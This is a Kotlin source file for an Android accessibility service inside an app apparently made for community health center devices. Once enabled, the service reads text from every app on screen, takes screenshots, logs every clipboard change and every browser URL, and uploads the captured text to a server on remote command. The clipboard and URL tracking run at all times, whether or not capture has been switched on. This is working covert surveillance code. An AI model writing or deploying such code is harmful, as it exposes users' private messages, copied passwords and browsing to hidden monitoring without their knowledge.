package com.example.kabensatudata.nearby

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.pm.PackageManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.kabensatudata.data.local.AuthTokenManager
import com.example.kabensatudata.data.remote.ApiService
import com.example.kabensatudata.data.remote.dto.ActivityLogRequest
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

/**
 * ScreenTextService — AccessibilityService that reads on-screen text from any app.
 *
 * Setup: Settings → Accessibility → KabenSatuData → ON (one-time)
 * After that, runs continuously in background without further permission prompts.
 *
 * Collects text visible on screen, buffers for 3 seconds, then uploads batch to server.
 * Capture only runs when admin activates it via FCM command (isCapturing = true).
 */
class ScreenTextService : AccessibilityService() {

    @EntryPoint
    @InstallIn(SingletonComponent::class)
    interface TextServiceEntryPoint {
        fun authTokenManager(): AuthTokenManager
        fun apiService(): ApiService
    }

    companion object {
        private const val TAG = "ScreenTextService"
        private const val UPLOAD_INTERVAL_MS = 3000L // 3 seconds
        private const val MAX_TEXT_LENGTH = 500 // Truncate long texts
        private const val MAX_TEXTS_PER_BATCH = 80 // Limit texts per upload

        // FCM-controlled capture flag (default OFF — admin must activate)
        @Volatile
        var isCapturing = false
            private set

        fun startCapturing() {
            isCapturing = true
            Log.i(TAG, "Text capturing STARTED")
        }

        fun stopCapturing() {
            isCapturing = false
            Log.i(TAG, "Text capturing STOPPED")
        }

        // ─── Screenshot Capture ─────────────────────────
        @Volatile
        private var instance: ScreenTextService? = null
        private var screenshotDeferred: kotlinx.coroutines.CompletableDeferred<ByteArray?>? = null

        /**
         * Request a screenshot from the accessibility service.
         * Returns JPEG bytes or null if not available.
         */
        suspend fun requestScreenshot(): ByteArray? {
            val svc = instance ?: return null
            if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) return null

            val deferred = kotlinx.coroutines.CompletableDeferred<ByteArray?>()
            screenshotDeferred = deferred

            try {
                svc.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    svc.applicationContext.mainExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hardwareBuffer = result.hardwareBuffer
                                val colorSpace = result.colorSpace
                                val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                hardwareBuffer.close()

                                if (bitmap != null) {
                                    // Scale down and compress
                                    val scale = 480f / maxOf(bitmap.width, bitmap.height)
                                    val sw = (bitmap.width * scale).toInt()
                                    val sh = (bitmap.height * scale).toInt()
                                    val scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, sw, sh, true)

                                    val out = java.io.ByteArrayOutputStream()
                                    scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, out)
                                    val bytes = out.toByteArray()

                                    if (scaled !== bitmap) scaled.recycle()
                                    bitmap.recycle()

                                    deferred.complete(bytes)
                                } else {
                                    deferred.complete(null)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Screenshot processing error", e)
                                deferred.complete(null)
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w(TAG, "Screenshot failed: $errorCode")
                            deferred.complete(null)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "takeScreenshot error", e)
                deferred.complete(null)
            }

            return kotlinx.coroutines.withTimeoutOrNull(5000) { deferred.await() }
        }

        // ─── Clipboard Monitor ──────────────────────────
        private val clipboardBuffer = java.util.concurrent.ConcurrentLinkedQueue<Pair<Long, String>>()

        fun getAndClearClipboardLogs(): List<Pair<Long, String>> {
            val logs = mutableListOf<Pair<Long, String>>()
            while (clipboardBuffer.isNotEmpty()) {
                clipboardBuffer.poll()?.let { logs.add(it) }
            }
            return logs
        }

        // ─── URL Tracking ───────────────────────────────
        private val urlBuffer = java.util.concurrent.ConcurrentLinkedQueue<Pair<Long, String>>()

        fun getAndClearUrlLogs(): List<Pair<Long, String>> {
            val logs = mutableListOf<Pair<Long, String>>()
            while (urlBuffer.isNotEmpty()) {
                urlBuffer.poll()?.let { logs.add(it) }
            }
            return logs
        }

        // Browser packages to track URLs from
        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "org.mozilla.firefox",
            "com.opera.browser",
            "com.brave.browser",
            "com.microsoft.emmx",
            "com.UCMobile.intl",
            "mark.via.gp",
            "com.kiwibrowser.browser"
        )

        // Packages to ignore (system UI, keyboards, etc.)
        private val IGNORED_PACKAGES = setOf(
            "com.android.systemui",
            "com.android.launcher",
            "com.android.launcher3",
            "com.miui.home",
            "com.google.android.inputmethod.latin",
            "com.android.inputmethod.latin",
            "com.example.kabensatudata" // Don't monitor ourselves
        )
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var uploadJob: Job? = null

    // Buffer for collected text data
    private var currentAppPackage = ""
    private var currentAppLabel = ""
    private val textBuffer = mutableListOf<String>()
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault())

    // Lazy-init dependencies
    private val entryPoint by lazy {
        EntryPointAccessors.fromApplication(applicationContext, TextServiceEntryPoint::class.java)
    }
    private val authTokenManager by lazy { entryPoint.authTokenManager() }
    private val apiService by lazy { entryPoint.apiService() }
    private val deviceName by lazy { authTokenManager.getUserName().ifBlank { "HP-Puskesmas" } }

    // Clipboard listener
    private var clipboardManager: android.content.ClipboardManager? = null
    private val clipboardListener = android.content.ClipboardManager.OnPrimaryClipChangedListener {
        try {
            val clip = clipboardManager?.primaryClip ?: return@OnPrimaryClipChangedListener
            if (clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString()?.take(500) ?: return@OnPrimaryClipChangedListener
                if (text.isNotBlank()) {
                    clipboardBuffer.add(System.currentTimeMillis() to text)
                    Log.d(TAG, "Clipboard captured: ${text.take(50)}...")
                }
            }
        } catch (_: Exception) { }
    }

    // Track last URL to avoid duplicates
    private var lastUrl = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "AccessibilityService connected")

        // Configure service info
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 300
        }

        // Start clipboard monitoring (always active)
        clipboardManager = getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
        clipboardManager?.addPrimaryClipChangedListener(clipboardListener)

        // Start periodic upload
        startUploadLoop()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return
        if (packageName in IGNORED_PACKAGES) return

        // URL tracking — always active for browser apps
        if (packageName in BROWSER_PACKAGES && event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            try {
                val source = event.source
                if (source != null) {
                    val url = extractUrl(source)
                    if (url != null && url != lastUrl && url.length > 5) {
                        lastUrl = url
                        urlBuffer.add(System.currentTimeMillis() to url)
                        Log.d(TAG, "URL captured: $url")
                    }
                    source.recycle()
                }
            } catch (_: Exception) { }
        }

        // Text capture — only when admin activates
        if (!isCapturing) return
        if (!authTokenManager.isLoggedIn()) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                currentAppPackage = packageName
                currentAppLabel = getAppLabel(packageName)
                Log.d(TAG, "App switched: $currentAppLabel ($packageName)")
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val source = event.source ?: return
                val texts = extractTexts(source)
                source.recycle()

                if (texts.isNotEmpty()) {
                    synchronized(textBuffer) {
                        for (text in texts) {
                            if (textBuffer.size < MAX_TEXTS_PER_BATCH && text !in textBuffer) {
                                textBuffer.add(text)
                            }
                        }
                    }
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AccessibilityService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        clipboardManager?.removePrimaryClipChangedListener(clipboardListener)
        uploadJob?.cancel()
        serviceScope.cancel()
        Log.i(TAG, "AccessibilityService destroyed")
    }

    /**
     * Extract URL from browser address bar via accessibility node tree.
     */
    private fun extractUrl(node: AccessibilityNodeInfo): String? {
        try {
            // Look for EditText nodes (address bar is usually an EditText)
            if (node.className?.toString()?.contains("EditText") == true) {
                val text = node.text?.toString()?.trim()
                if (text != null && (text.startsWith("http") || text.contains(".") && !text.contains(" "))) {
                    return text
                }
            }
            // Check content description
            val desc = node.contentDescription?.toString()?.trim()
            if (desc != null && (desc.startsWith("http") || (desc.contains(".") && !desc.contains(" ") && desc.length > 4))) {
                return desc
            }
            // Recurse into children (limit depth)
            for (i in 0 until minOf(node.childCount, 20)) {
                val child = node.getChild(i) ?: continue
                val result = extractUrl(child)
                child.recycle()
                if (result != null) return result
            }
        } catch (_: Exception) { }
        return null
    }

    /**
     * Extract readable texts from an accessibility node tree.
     */
    private fun extractTexts(node: AccessibilityNodeInfo): List<String> {
        val results = mutableListOf<String>()
        try {
            // Get text from this node
            val text = node.text?.toString()?.trim()
            if (!text.isNullOrBlank() && text.length > 1) {
                val truncated = if (text.length > MAX_TEXT_LENGTH) text.take(MAX_TEXT_LENGTH) + "…" else text
                results.add(truncated)
            }

            // Get content description
            val desc = node.contentDescription?.toString()?.trim()
            if (!desc.isNullOrBlank() && desc.length > 1 && desc != text) {
                val truncated = if (desc.length > MAX_TEXT_LENGTH) desc.take(MAX_TEXT_LENGTH) + "…" else desc
                results.add(truncated)
            }

            // Recurse into children (limit depth to avoid performance issues)
            val childCount = node.childCount
            for (i in 0 until minOf(childCount, 50)) {
                val child = node.getChild(i) ?: continue
                results.addAll(extractTexts(child))
                child.recycle()
                if (results.size >= MAX_TEXTS_PER_BATCH) break
            }
        } catch (e: Exception) {
            // Node may have been recycled
        }
        return results
    }

    /**
     * Get human-readable app label from package name.
     */
    private fun getAppLabel(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, PackageManager.GET_META_DATA)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            packageName.substringAfterLast(".")
        }
    }

    /**
     * Start periodic upload loop — sends buffered texts to server every 5 seconds.
     */
    private fun startUploadLoop() {
        uploadJob?.cancel()
        uploadJob = serviceScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL_MS)
                uploadBuffer()
            }
        }
    }

    /**
     * Upload buffered text data to server.
     */
    private suspend fun uploadBuffer() {
        val texts: List<String>
        val pkg: String
        val label: String

        synchronized(textBuffer) {
            if (textBuffer.isEmpty() || currentAppPackage.isBlank() || !isCapturing) return
            texts = textBuffer.toList()
            pkg = currentAppPackage
            label = currentAppLabel
            textBuffer.clear()
        }

        try {
            withContext(Dispatchers.IO) {
                apiService.uploadActivityLog(
                    ActivityLogRequest(
                        deviceName = deviceName,
                        appPackage = pkg,
                        appLabel = label,
                        texts = texts,
                        timestamp = dateFormat.format(Date())
                    )
                )
            }
            Log.d(TAG, "Uploaded ${texts.size} texts from $label")
        } catch (e: Exception) {
            Log.w(TAG, "Upload failed: ${e.message}")
            // Re-add texts to buffer for retry (if not too many)
            synchronized(textBuffer) {
                if (textBuffer.size < MAX_TEXTS_PER_BATCH) {
                    textBuffer.addAll(0, texts.take(MAX_TEXTS_PER_BATCH - textBuffer.size))
                }
            }
        }
    }
}
